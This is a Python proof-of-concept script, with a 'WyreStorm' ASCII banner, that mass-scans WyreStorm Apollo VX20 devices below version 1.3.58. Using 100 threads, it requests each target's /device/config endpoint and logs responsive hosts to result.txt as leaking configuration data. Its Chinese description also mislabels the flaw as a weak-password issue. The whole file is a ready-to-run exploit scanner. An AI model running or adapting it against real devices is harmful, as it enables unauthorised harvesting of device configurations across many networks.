import requests
import re
import argparse
import sys
from multiprocessing.dummy import Pool
# requests.packages.urllib3.disable_warnings()
def banner():
    test = """
 __      __                         _________ __                        
/  \    /  \___.__._______   ____  /   _____//  |_  ___________  _____  
\   \/\/   <   |  |\_  __ \_/ __ \ \_____  \\   __\/  _ \_  __ \/     \ 
 \        / \___  | |  | \/\  ___/ /        \|  | (  <_> )  | \/  Y Y  \
  \__/\  /  / ____| |__|    \___  >_______  /|__|  \____/|__|  |__|_|  /
       \/   \/                  \/        \/                         \/ 
                                                            version:WyreStorm Apollo VX20 < 1.3.58                          
"""
    print(test)

def main():
    banner()
    #处理命令行输入的参数
    parser = argparse.ArgumentParser(description="WyreStorm存在弱口令漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input file')
    #处理参数
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for line in f.readlines():
                url_list.append(line.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = '/device/config'
    url = target + payload
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
        'Connection': 'close',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'Accept-Encoding': 'gzip'		
    }
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    try:
        response = requests.get(url=url,headers=headers,proxies=proxies,verify=False)
        if response.status_code == 200:
            print(f"[*该网址存在信息泄露漏洞{target}]")
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(target + '\n')
        else:
            print(f"[+该网址不存在信息泄露漏洞{target}]")
    except Exception as e:
        print(f"[-该网址存在问题，请手动检测{target}]")

if __name__ =='__main__':
    main()